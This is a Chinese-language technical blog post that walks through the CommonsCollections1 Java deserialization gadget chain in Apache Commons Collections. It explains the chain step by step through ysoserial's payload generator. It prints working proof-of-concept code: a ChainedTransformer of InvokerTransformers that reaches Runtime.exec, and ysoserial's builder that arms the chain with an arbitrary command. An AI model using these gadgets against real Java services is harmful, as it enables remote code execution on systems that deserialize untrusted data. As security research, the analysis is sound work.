> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lv-87DN7MKc521q0LjopQQ)

前言基础知识 Transformer 利用 InvokerTransformer 造成命令执行 MapTransformedMapLazyMap 动态代理代码展示 CommonsCollections1 分析`transformerChain`对象和`transformers`对象创建 lazymap 对象的动态代理 AnnotationInvocationHandler.invoke()AnnotationInvocationHandler.readObject() 总结参考资料

前言
--

`Apache Commons Collections`是 Java 中应用广泛的一个库，包括 Weblogic、JBoss、WebSphere、Jenkins 等知名大型 Java 应用都使用了这个库。

基础知识
----

### Transformer

**介绍**：`Transfomer`是 Apache Commons Collections 库引入的一个**接口**，**每个具体的 Transformer 类**必须实现 Transformer 接口，比如这里**自定义一个 Transformer 类**：

```
package com.feng;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

public class MyTransformer implements Transformer, Serializable {
   public String name;

   private MyTransformer(String name){
       System.out.println("in MyTransformer:MyTransformer()");
       this.name = name;
  }

   public static Transformer getInstance(String name){
       System.out.println("in MyTransformer:getInstance()");
       return new MyTransformer(name);
  }

   @Override
   public Object transform(Object input) {
       System.out.println("in MyTransformer:transform()");
       System.out.println("input is: " + input);
       return this.name;
  }
   
   public static void main(String[] args) {
      ...

```

实现`Transformer`接口，重载`transform`方法。

**重点**：当一个`Transformer`通过`TransformedMap`的 **decorate 方法**绑定到 **Map 的 key 或 value 上时**，如果这个 **Map 的 key 或 value 发生了变化**，则会**调用`Transformer`的`transform`方法**。

poc 测试代码：

```
   public static void main(String[] args) {
       // 获取一个MyTransformer实例
       MyTransformer myTransformer = (MyTransformer)MyTransformer.getInstance("trans-value");

       Map normalMap = new HashMap();  // 创建一个map
       normalMap.put("key1", "value1");
       normalMap.put("key2", "value2");
//       System.out.println(normalMap); // {key2=value2, key1=value1}

       // 将MyTransformer实例作为valueTransformer（第三个参数）绑定到 normalMap上，
       // 即当normalMap的value更新时，自动调用MyTransformer的transform方法
       Map transformedMap = TransformedMap.decorate(normalMap, null, myTransformer);

       Map.Entry entry = (Map.Entry)transformedMap.entrySet().iterator().next();   // 获取map中的第一组元素
       entry.setValue("newvalue");     // 更改map的value，导致触发MyTransformer的transform方法

       System.out.println(normalMap);
  }
}

```

创建一个`MyTransformer`对象，并使`this.`。

然后创建一个 Map 对象，并且通过`TransformedMap.decorate`方法将`MyTransformer`绑定到 map 对象的 value 上（第三个参数），第二个参数为绑定到 map 对象的 key 上的`Transformer`，为空。

接着对 Map 的 value 进行修改，因为`MyTransformer`已经绑定到 map 的 value 上了，所以会触发绑定了的`MyTransformer`的`transform`方法。该`transform`方法直接返回`this.name`，即直接返回`"trans-value"`这个字符串，赋值给 value：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVGnCgfB93q9dqRhYyDs6LmqxLia82WIB9x2j8DMNnhLBklFib6QyURafGOEWjTd2oiavOlxbJO6UzwA/640?wx_fmt=png)

`Apache-Common-Collections-3.2`中提供的一些`Transformer`类：

**ConstantTransformer**：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVGnCgfB93q9dqRhYyDs6LmBVExtLiasM6bibl8Kf0sCQ4Uq1yricFDCLYGhXK1PYo7KFCMxT5WEBqiaw/640?wx_fmt=png)

跟上面自己定义的`MyTransformer`类一样，`transform`方法返回的都是实例化时的第一个参数。

**InvokerTransformer**：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVGnCgfB93q9dqRhYyDs6LmQBlbo4dFibeOh6PG8eIl6vCVPtkpibib0wJFnyfyNDCWIBjDlfjUxFhsw/640?wx_fmt=png)

在其`transform()`方法中可以通过 **Java 反射机制来进行执行任意代码**。

构造函数的三个内部变量可控：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVGnCgfB93q9dqRhYyDs6Lmbmzt72ibB7ddwWrJpx1rPAbAL2n0YtHhV0U6w8ibIvqW0an6WDicAgicOw/640?wx_fmt=png)

`transform`方法输入的`input`可控，存在 RCE。

**ChainedTransformer**：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVGnCgfB93q9dqRhYyDs6Lmuh85CIS1N3CkbyfjHeicf7vCmQMNMsRYeTc2HgFkoibxeoPiaDoyIKUFQ/640?wx_fmt=png)

可以通过一个`Trasnformer[]数组`来对一个对象进行**链式执行**`transform()`。

#### 利用 InvokerTransformer 造成命令执行

poc 测试代码：

```
package com.feng;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class InvokerTransformerRCE {
   public static void main(String[] args) {
       Transformer[] transformers = new Transformer[] {
               new ConstantTransformer(Runtime.class),
               new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[]{}}),
               new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{new Object[]{}, new Object[]{}}),
               new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
      };

       Transformer transformerChain = new ChainedTransformer(transformers);
       transformerChain.transform("aaa");
  }
}

```

首先利用`ChainedTransformer`类构建一个 **Transformer 链**，**通过调用多个 Transformer 类**来造成命令执行。

当调用`ChainedTransformer.transform()`时，会把`Transformer[]`数组中的所有`Transformer`都执行一次`transform()`方法，造成命令执行。以上代码相当于这一行代码：

```
Runtime.getRuntime().getClass().getMethod("exec",
new Class[]{String.class}).invoke(Runtime.getRuntime(),"calc");

```

### Map

#### TransformedMap

利用前面说的使用`TransformedMap.decorate`方法将`transformer`实现类绑定到`map`上，更新 value 时自动调用`transform`方法，将`ChainedTransformer`进行绑定，调用`ChainedTransformer.transform`方法：

```
public static void main(String[] args) {
   Transformer[] transformers = new Transformer[] {
       new ConstantTransformer(Runtime.class),
       new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[]{}}),
       new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{new Object[]{}, new Object[]{}}),
       new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
  };

   Transformer chainedTransformer = new ChainedTransformer(transformers);
   //       chainedTransformer.transform("aaa");
   Map normalMap = new HashMap();
   normalMap.put("aa", "11");
   Map transformedMap = TransformedMap.decorate(normalMap, null, chainedTransformer);
   Map.Entry entry = (Map.Entry) transformedMap.entrySet().iterator().next();
   entry.setValue("newvalue");
}

```

#### LazyMap

```
Map lazyMap = LazyMap.decorate(normalMap, chainedTransformer);

```

当调用 lazymap 的`get(key)`方法时，key 不存在，则会调用`chainedTransformer`的 transform 方法。

**这些不同的 Map 类型之间的差异也正是 CommonsColletions 有那么多 gadget 的原因之一。**

### 动态代理

代理就是创建一个代理类，通过调用器的`invoke`方法代理执行真实类对象的对应方法。

具体原理可以参考相关学习资料，贴一个简单的项目代码。

#### 代码展示

`User.java`

定义一个`公共接口`和`真实主题`

```
package com.dynamic;

interface UserService{
   public void select();
   public void update();
}

class UserServiceImpl implements UserService{
   @Override
   public void select() {
       System.out.println("查询 selectById");
  }

   @Override
   public void update() {
       System.out.println("更新 update");
  }
}

```

`LogHandler.java`

定义一个传给代理类的 `请求处理器对象`，重写`invoke`方法，代理对象的所有方法都会调用该处理器对象的 invoke 方法

```
package com.dynamic;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Date;

public class LogHandler implements InvocationHandler {
   Object target;      // 被代理的对象，真实主题，实际的方法执行者

   public LogHandler(Object target){
       this.target = target;
  }

   @Override
   public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
       before();
       Object result = method.invoke(target, args);
       after();
       return result;      // 需要返回方法的执行结果
  }

   // 调用invoke方法之前执行
   private void before(){
       System.out.println(String.format("log start time [%s]", new Date()));
  }

   // 调用invoke方法之后执行
   private void after(){
       System.out.println(String.format("log end time [%s]", new Date()));
  }
}

```

`Client2.java`

创建调用`代理对象`

```
package com.dynamic;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

public class Client2 {
   public static void main(String[] args) {
       // 1. 创建被代理的对象，UserService接口实现的类
       UserService userserviceimpl = new UserServiceImpl();

       // 2. 获取对应的ClassLoader
       ClassLoader classloader = userserviceimpl.getClass().getClassLoader();

       //3. 获取所有接口的Class，这里的UserServiceImpl类只实现了一个接口UserService
       Class[] interfaces = userserviceimpl.getClass().getInterfaces();

       // 4. 创建一个传给代理类的 **请求处理器对象**，处理所有的代理对象上的方法调用
       //   这里创建的是一个自定义的日志处理器（LogHandler），须传入实际的执行对象userserviceimpl
       InvocationHandler loghandler = new LogHandler(userserviceimpl);

       // 5. 根据上面的信息，创建 **代理对象**
       UserService proxy = (UserService) Proxy.newProxyInstance(classloader, interfaces, loghandler);
       /*
       a. JDK会根据传入的参数信息动态地在内存中创建和.class文件等同的字节码（classloader、所有接口的Class、请求处理器）
       b. 然后根据相应的字节码转换成对应的class
       c. 然后调用newInstance
        */

       proxy.select();
       proxy.update();
  }
}

```

CommonsCollections1 分析
----------------------

首先看下 ysoserial 是如何生成 cc1 链的 payload：

入口函数为`GeneratePayload.main`，根据传入的参数选择生成对应的类对象，并反序列化输出 / 保存。

对于 cc1 链，生成对应类对象的代码如下：

```
public InvocationHandler getObject(final String command) throws Exception {
   final String[] execArgs = new String[] { command };
   // inert chain for setup
   final Transformer transformerChain = new ChainedTransformer(
       new Transformer[]{ new ConstantTransformer(1) });
   // real chain for after setup
   final Transformer[] transformers = new Transformer[] {
       new ConstantTransformer(Runtime.class),
       new InvokerTransformer("getMethod", new Class[] {
           String.class, Class[].class }, new Object[] {
           "getRuntime", new Class[0] }),
       new InvokerTransformer("invoke", new Class[] {
           Object.class, Object[].class }, new Object[] {
           null, new Object[0] }),
       new InvokerTransformer("exec",
                              new Class[] { String.class }, execArgs),
       new ConstantTransformer(1) };

   final Map innerMap = new HashMap();

   final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

   final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

   final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

   Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

   return handler;
}

```

### `transformerChain`对象和`transformers`对象

首先还是我们熟悉的，创建`transformerChain`对象和`transformers`对象，这里跟前面讲的流程有点不同，`ChainedTransformer`在实例化的时候并不是直接将`transformers`作为构造函数参数，而是在最后进行修改。其实这里完全可以在程序最开始就赋值给`transformerChain`。

通过`LazyMap.decorate()`将`transformerChain`对象绑定 LazyMap 上，当调用`LazyMap.get(key)`时，key 不存在时会调用 Transformer 的 transform() 方法。

### 创建 lazymap 对象的动态代理

然后创建`lazyMap`的动态代理：

```
final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

```

跟进`Gadgets.createMemoitizedProxy`方法：

```
public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
   // 这里createMemoizedInvocationHandler(map)返回的对象是AnnotationInvocationHandler对象，
   // 这个对象的memberValues变量的值就是我们上面创建的LazyMap
return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
}


public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
}


public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
allIfaces[ 0 ] = iface;
if ( ifaces.length > 0 ) {
System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
}
return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XVGnCgfB93q9dqRhYyDs6LmETlp0LVGxK83wGVqcVqql0CW6AsBGtibYt49jMK78Dibiaaiasn0EWMttw/640?wx_fmt=png)

回到前面的代码：

```
final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

```

`mapProxy`是一个代理对象，代理的是`lazymap`这个对象。结合动态代理的相关知识，要调用`mapProxy`的任何方法，都是去调用`AnnotationInvocationHandler`的`invoke()`方法。

### AnnotationInvocationHandler.invoke()

```
public Object invoke(Object proxy, Method method, Object[] args) {
   String member = method.getName();
   Class<?>[] paramTypes = method.getParameterTypes();

   // Handle Object and Annotation methods
   if (member.equals("equals") && paramTypes.length == 1 &&
       paramTypes[0] == Object.class)
       return equalsImpl(args[0]);
   if (paramTypes.length != 0)
       throw new AssertionError("Too many parameters for an annotation method");

   switch(member) {
   case "toString":
       return toStringImpl();
   case "hashCode":
       return hashCodeImpl();
   case "annotationType":
       return type;
  }

   // Handle annotation member accessors
   Object result = memberValues.get(member);

   if (result == null)
       throw new IncompleteAnnotationException(type, member);

   if (result instanceof ExceptionProxy)
       throw ((ExceptionProxy) result).generateException();

   if (result.getClass().isArray() && Array.getLength(result) != 0)
       result = cloneArray(result);

   return result;
}

```

对于这行代码：

```
Object result = memberValues.get(member);

```

`memberValues`这个字段属于`AnnotationInvocationHandler`类，在前面实例化的时候，我们已经将该字段赋值为`lazymap`对象，那么只要`member`这个变量的值不存在 lazymap 的键中，就能触发绑定到 LazyMap 上的 Transformer 类的`transform()`方法，达到我们的目的。

### AnnotationInvocationHandler.readObject()

继续后面几行代码：

```
final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

return handler;

```

`createMemoizedInvocationHandler`方法就是创建一个`AnnotationInvocationHandler`对象，同时将`mapProxy`这个代理类赋值给该对象的`memberValues`字段。注意这里已经有两个`memberValues`了。

最后需要序列化的类就是这个`AnnotationInvocationHandler`。反序列化时会调用它的`readObject`方法：

```
private void readObject(java.io.ObjectInputStream s)
   throws java.io.IOException, ClassNotFoundException {
   s.defaultReadObject();

   // Check to make sure that types have not evolved incompatibly

   AnnotationType annotationType = null;
   try {
       annotationType = AnnotationType.getInstance(type);
  } catch(IllegalArgumentException e) {
       // Class is no longer an annotation type; time to punch out
       throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
  }

   Map<String, Class<?>> memberTypes = annotationType.memberTypes();

   // If there are annotation members without values, that
   // situation is handled by the invoke method.
   for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
       String name = memberValue.getKey();
       Class<?> memberType = memberTypes.get(name);
       if (memberType != null) {  // i.e. member still exists
           Object value = memberValue.getValue();
           if (!(memberType.isInstance(value) ||
                 value instanceof ExceptionProxy)) {
               memberValue.setValue(
                   new AnnotationTypeMismatchExceptionProxy(
                       value.getClass() + "[" + value + "]").setMember(
                           annotationType.members().get(name)));
          }
      }
  }
}

```

注意这行代码：

```
for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {

```

**这里的 memberValues 的值是动态代理对象**，他要执行 entrySet 方法，需要通过`AnnotationInvocationHandler.invoke()`方法，而回到这个方法里面：

```
Object result = memberValues.get(member);

```

**这里的 memberValues 的值是 lazymap 这个对象**，`member`变量的值就是字符串`entrySet`，不存在这个键，自然就会进入 LazyMap 绑定的 Transformer 类的`transform()`方法中，然后触发连锁反应，执行我们构造好的命令。

总结
--

从反序列化`readObject`的过程倒推看整个过程，调用链如下

```
ObjectInputStream.readObject()
-> AnnotationInvocationHandler.readObject()
-> this.memberValues.entrySet() = mapProxy(代理对象).entrySet()
-> AnnotationInvocationHandler.invoke()
-> this.memberValues.get(xx) = LazyMap.get(not_exist_key)
-> ChainedTransformer.transform()
-> InvokerTransfomer.transform()
-> RCE

```

整体调用过程还是不复杂的，只是需要的基础只是比较多：java 反射、动态代理以及一些 map 类的特征。

参考资料
----

ysoserial 分析【一】Apache Commons Collections